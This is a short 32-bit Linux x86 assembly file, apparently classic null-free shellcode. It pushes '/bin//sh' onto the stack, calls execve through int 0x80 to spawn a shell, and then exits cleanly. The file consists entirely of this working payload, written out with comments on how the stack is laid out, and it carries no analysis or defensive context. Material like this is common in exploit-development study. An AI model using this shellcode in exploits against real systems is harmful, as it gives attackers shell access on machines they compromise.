global _start:

section .text

_start:
    xor eax, eax
    xor ebx, ebx
    xor ecx, ecx
    xor edx, edx

execve:
    ; execve('/bin//sh', ['/bin//sh',NULL], NULL)
    mov al,0x0B
   
    ; [ /bin//sh | 0x00000000 ] 
    push ebx        ; \x00
    push "//sh"
    push "/bin"
    mov ebx, esp    ; ebx = /bin//sh

    ; [ Addr of /bin//sh | 0x00000000 | /bin//sh | 0x00000000 ]
    push ecx        ; \x00
    push ebx        ; Address containing '/bin//sh' string
    mov ecx, esp    ; ecx = address of /bin//sh
   
    int 0x80

exit:
    ; exit(0)
    xor eax, eax
    inc eax         ; eax = 1 (Syscall for exit)
    
    xor ebx, ebx    ; exit code
    int 0x80 
